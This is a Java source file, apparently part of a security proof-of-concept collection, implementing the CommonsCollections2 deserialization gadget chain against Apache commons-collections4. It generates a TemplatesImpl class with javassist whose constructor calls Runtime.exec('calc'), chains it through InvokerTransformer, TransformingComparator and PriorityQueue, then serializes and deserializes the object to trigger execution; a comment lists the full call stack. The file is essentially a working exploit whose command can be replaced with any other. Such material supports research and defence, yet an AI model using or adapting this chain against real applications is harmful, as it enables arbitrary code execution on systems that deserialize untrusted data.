package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * transform:129, InvokerTransformer (org.apache.commons.collections4.functors)
 * compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
 * siftDownUsingComparator:721, PriorityQueue (java.util)
 * siftDown:687, PriorityQueue (java.util)
 * heapify:736, PriorityQueue (java.util)
 * readObject:795, PriorityQueue (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:59, SerializeUtils (com.javasec.utils)
 * main:37, CommonsCollections2 (com.javasec.pocs.cc)
 */
public class CommonsCollections2 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        SerializeUtils.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        SerializeUtils.setFieldValue(templatesImpl, "_name", "boogipop");
        SerializeUtils.setFieldValue(templatesImpl, "_tfactory", null);
        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);
        priorityQueue.add(templatesImpl);
        priorityQueue.add(2);
        Class tc=transformingComparator.getClass();
        Field comparator = tc.getDeclaredField("transformer");
        comparator.setAccessible(true);
        comparator.set(transformingComparator,invokerTransformer);
        String s = SerializeUtils.base64serial(priorityQueue);
        SerializeUtils.base64deserial(s);
    }
}
